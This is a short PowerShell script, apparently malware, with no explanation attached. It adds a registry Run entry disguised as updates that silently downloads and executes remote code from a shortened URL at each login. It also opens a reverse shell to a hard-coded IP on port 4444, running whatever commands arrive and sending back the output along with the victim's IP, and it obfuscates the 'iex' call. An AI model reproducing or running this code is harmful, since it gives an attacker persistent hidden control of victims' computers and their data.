$command = 'Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://shorturl.at/OjiMT | iex`""'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Resolved_Upates" -Value $command
$ipAddr = ([System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1).ToString()
$h='System.Net.Sockets.TCPClient';$a='System.Text.ASCIIEncoding';
$i = "134.209.113.62";$p = 4444
$c = New-Object ($h) ($i, $p)
$s = $c.GetStream()
$b = 0..65535 | % { 0 }
while (($r = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object ($a)).GetString($b, 0, $r)
    $t = &('ie' + 'x') $d 2>&1 | Out-String
    $t2 = "[$ipAddr]`n$t`nPS " + (pwd).Path + "> "
    $m = [Text.Encoding]::ASCII.GetBytes($t2)
    $s.Write($m, 0, $m.Length)
    $s.Flush()
}
$c.Close()
